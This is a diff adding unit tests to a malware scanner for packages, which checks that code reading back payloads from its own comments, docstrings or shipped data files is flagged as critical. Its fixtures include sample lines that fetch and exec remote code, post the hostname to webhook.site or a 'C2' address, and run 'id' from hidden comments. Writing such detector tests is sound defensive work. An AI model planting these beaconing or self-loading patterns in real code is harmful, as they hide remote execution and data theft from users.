@@ -182,7 +182,8 @@ class ImportTimeProseTests(unittest.TestCase):
 
     def test_what_stays_code(self):
         run_doc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n'
-        self.assertEqual(core.import_time_risk(run_doc, "py")[0], ["runs code it receives over the network"])
+        self.assertEqual(core.import_time_risk(run_doc, "py")[0], ["runs code it receives over the network",
+                                                                    SelfReadTests.OWN])
         beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())'
         for text in (f"x = (\n    \"\"\"{beacon}\"\"\"\n)\n",            # an argument
                      f"x = \\\n\"\"\"{beacon}\"\"\"\n",                    # a continued line
@@ -197,6 +198,56 @@ class ImportTimeProseTests(unittest.TestCase):
         text = "# a comment\n'''doc\n\n'''\nimport requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
         self.assertEqual(core.import_time_risk(text, "py")[1], core.import_time_risk(text)[1])
         self.assertEqual(core.import_time_risk(text, "py")[1], 6)
+
+
+class SelfReadTests(unittest.TestCase):
+    """Code read back from the file itself: a payload or an address kept in a
+    comment or a docstring (the review question that followed the prose
+    rule), and code run from a data file shipped next to it."""
+    OWN = "runs code it reads back from its own file or a data file shipped with it"
+
+    def test_an_address_in_a_comment_of_a_file_that_reads_itself(self):
+        text = ("# C2: https://webhook.site/abc\nimport socket, requests, re\n"
+                "url = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
+                "requests.post(url, data=socket.gethostname())\n")
+        self.assertTrue(core.reads_own_source(text))
+        self.assertEqual(core.import_time_risk(text, "py"), core.import_time_risk(text))
+        self.assertEqual(core.import_time_severity(core.import_time_risk(text, "py")[0]), "CRITICAL")
+
+    def test_code_run_from_its_own_prose(self):
+        for lang, text, line in (
+                ("py", '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n', 4),
+                ("py", 'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n', 3),
+                ("py", '"""print(1)"""\nexec(__doc__)\n', 2),
+                ("py", "import linecache\nexec(''.join(linecache.getlines(__file__)[-1:])[1:])\n#print(1)\n", 2),
+                ("js", "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n"
+                       "/* require('child_process').execSync('id') */\n", 2),
+                ("js", "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
+                       "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n", 2)):
+            with self.subTest(text[:30]):
+                self.assertEqual(core.import_time_risk(text, lang), ([self.OWN], line))
+                self.assertIn(self.OWN, core.install_script_risk(text))
+                self.assertEqual(core.import_time_severity([self.OWN]), "CRITICAL")
+
+    def test_code_run_from_a_data_file_shipped_with_it(self):
+        for text in ('import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n',
+                     'from pathlib import Path\nblob = (Path(__file__).parent / "data.bin").read_bytes()\n'
+                     'exec(zlib.decompress(blob))\n',
+                     "const fs = require('fs'), path = require('path');\n"
+                     "eval(fs.readFileSync(path.join(__dirname, 'a.dat'), 'utf8'));\n"):
+            with self.subTest(text[:30]):
+                self.assertGreaterEqual(core.runs_own_source_at(text), 0)
+
+    def test_what_is_not(self):
+        for text in ("import os\nhere = os.path.dirname(__file__)\n"
+                     "exec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",     # setup.py reads a version
+                     '"""Tool."""\nimport argparse\np = argparse.ArgumentParser(description=__doc__)\n',
+                     'import subprocess, sys\nsubprocess.run([sys.executable, __file__, "--child"])\n',
+                     "import doctest\nexec(compile(example.__doc__, 'x', 'exec'))\n",     # another object's docstring
+                     'SHIM = """exec(compile(open(__file__).read(), __file__, "exec"))"""\nsubprocess.run([py, "-c", SHIM])\n',
+                     "NAMES = ('__doc__', '__name__')\nsrc = 'def f(): pass'\nexec(src)\n"):
+            with self.subTest(text[:30]):
+                self.assertEqual(core.runs_own_source_at(text), -1)
 
 
 class DecoderAliasTests(unittest.TestCase):
